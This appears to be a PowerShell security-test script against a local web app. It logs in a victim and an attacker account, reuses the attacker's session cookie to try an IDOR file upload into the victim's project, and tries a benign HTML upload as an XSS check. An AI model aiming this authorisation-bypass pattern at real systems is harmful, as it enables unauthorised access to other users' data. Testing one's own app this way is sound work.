

# 1. Login Victim
$loginUrl = "http://localhost:5000/api/login"
$projectUrl = "http://localhost:5000/api/projects"

try {
    Write-Host "Logging in Victim..."
    $victimResponse = Invoke-RestMethod -Uri $loginUrl -Method Post -ContentType "application/json" -Body '{"username":"victim@test.com", "password":"password123"}' -SessionVariable victimSession
    
    # 2. Create Project
    Write-Host "Creating Victim Project..."
    $projectResponse = Invoke-RestMethod -Uri $projectUrl -Method Post -ContentType "application/json" -Body '{"title":"Top Secret", "clientName":"Gov", "status":"draft", "currentStage":1}' -WebSession $victimSession
    $projectId = $projectResponse.id
    Write-Host "TARGET PROJECT ID: $projectId"

    # 3. Login Hacker
    Write-Host "Logging in Hacker..."
    $hackerResponse = Invoke-RestMethod -Uri $loginUrl -Method Post -ContentType "application/json" -Body '{"username":"hacker@test.com", "password":"password123"}' -SessionVariable hackerSession

    # 4. Exploit IDOR
    Write-Host "Attempting IDOR Upload as Hacker..."
    
    $uploadUrl = "http://localhost:5000/api/projects/$projectId/upload"
    $boundary = [System.Guid]::NewGuid().ToString() 
    $LF = "`r`n"
    
    $fileContent = "This file was uploaded by a hacker."
    $fileName = "hacked.txt"
    "This file was uploaded by a hacker." | Out-File -FilePath $fileName -Encoding ASCII

    # Construct Multipart Body manually (PS < 6) or use form (PS 7)
    # Using a simpler method: curl.exe for the actual exploit step because Multipart in PS 5.1 is painful.
    # We need to save the Hacker Session cookies to a file for curl.
    
    # Actually, let's just use curl.exe for the exploit step, passing cookies manually? Hard.
    # Let's use Invoke-WebRequest with multipart logic if reachable?
    # Or just use curl.exe with the session cookie string?
    # Inspect session cookies.
    
    $cookie = $hackerSession.Cookies.GetCookies($loginUrl) | Where-Object { $_.Name -eq "connect.sid" }
    $cookieValue = "connect.sid=" + $cookie.Value
    
    Write-Host "Hacker Cookie: $cookieValue"
    
    # Use curl.exe for the upload, passing the cookie header.
    # This avoids generic PS multipart pain.
    curl.exe -X POST $uploadUrl -H "Cookie: $cookieValue" -F "files=@hacked.txt" -v

    # 5. Exploit XSS (Upload .html to Hacker's own project)
    Write-Host "Creating Hacker Project for XSS Test..."
    $hackerProjectResponse = Invoke-RestMethod -Uri $projectUrl -Method Post -ContentType "application/json" -Body '{"title":"Hacker Project", "clientName":"Evil Corp", "status":"draft", "currentStage":1}' -WebSession $hackerSession
    $hackerProjectId = $hackerProjectResponse.id
    Write-Host "Hacker Project ID: $hackerProjectId"

    "<h1>XSS</h1>" | Out-File -FilePath "xss.html" -Encoding ASCII
    $xssUrl = "http://localhost:5000/api/projects/$hackerProjectId/upload"
    
    Write-Host "Attempting XSS Upload (Should Fail)..."
    curl.exe -X POST $xssUrl -H "Cookie: $cookieValue" -F "files=@xss.html" -v

}
catch {
    Write-Host "Error: $_"
    exit 1
}
